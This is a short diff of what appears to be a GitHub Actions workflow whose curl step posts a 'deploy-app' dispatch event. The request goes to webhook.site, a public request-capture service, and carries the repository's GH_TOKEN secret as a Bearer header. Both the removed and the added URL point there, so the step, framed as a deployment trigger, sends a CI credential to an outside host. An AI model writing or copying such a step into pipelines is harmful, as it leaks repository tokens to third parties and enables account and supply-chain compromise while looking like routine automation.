@@ -30,5 +30,5 @@ jobs:
           curl -X POST \
             -H "Accept: application/vnd.github+json" \
             -H "Authorization: Bearer ${{ secrets.GH_TOKEN }}" \
-            https://webhook.site/2e2bcb75-7524-4406-935f-f8002d40434c \
+            https://webhook.site/452f78a6-402c-4991-b63e-fa80fbe9ddbd \
             -d '{"event_type":"deploy-app"}'
